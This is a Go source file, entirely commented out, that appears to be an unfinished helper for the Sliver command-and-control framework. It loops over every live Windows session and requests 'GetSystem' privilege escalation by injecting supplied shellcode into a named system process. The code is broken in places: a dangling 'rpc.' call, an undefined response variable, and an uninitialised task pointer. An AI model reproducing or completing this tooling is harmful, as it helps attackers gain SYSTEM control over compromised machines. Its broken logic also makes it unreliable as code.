package dispatch

// import (
// 	"context"
// 	"fmt"
// 	"log"
// 	"os"
// 	"strings"

// 	"github.com/bishopfox/sliver/protobuf/clientpb"
// 	"github.com/bishopfox/sliver/protobuf/commonpb"
// 	"github.com/bishopfox/sliver/protobuf/rpcpb"
// 	"github.com/bishopfox/sliver/protobuf/sliverpb"
// 	"github.com/bishopfox/sliver/server/core"
// 	"google.golang.org/protobuf/proto"
// )

// func GetSystem(rpc rpcpb.SliverRPCClient, args ...string) {

// 	if len(args) < 2 {
// 		fmt.Println("Need the full path to sliver shellcode and a system process name to inject to.")
// 		return
// 	}

// 	b_shc, err := os.ReadFile(args[0])
// 	if err != nil {
// 		fmt.Println("Error reading file:", err)
// 		return
// 	}
// 	var sessions *clientpb.Sessions

// 	sessions, err = rpc.GetSessions(context.Background(), &commonpb.Empty{})
// 	if err != nil {
// 		log.Fatal(err)
// 	}

// 	var session *clientpb.Session
// 	var shellcode_task *sliverpb.Task
// 	for _, session = range sessions.GetSessions() {
// 		if !session.IsDead && session.OS == "windows" {

// 			fmt.Println(fmt.Sprintf("==| ID: %-10s | Host: %-20s | Address: %-15s | Username: %-10s |==",
// 				strings.Split(session.ID, "-")[0],
// 				session.Hostname,
// 				strings.Split(session.RemoteAddress, ":")[0],
// 				session.Username))

// 			var req []byte
// 			req, err = proto.Marshal(&sliverpb.InvokeGetSystemReq{
// 				Data:           b_shc,
// 				HostingProcess: args[1],
// 				Request: &commonpb.Request{
// 					Async:     false,
// 					SessionID: session.ID,
// 				},
// 			})

// 			rpc.

// 			if err != nil {
// 				fmt.Println("Error: " + shellcode_task.Response.Err)
// 			}

// 			parsed := &sliverpb.GetSystem{}
// 			err = proto.Unmarshal(getsys_resp, parsed)

// 			if parsed.Response != nil {
// 				fmt.Println("Response: " + parsed.Response.String())
// 			}

// 		}
// 	}
// }
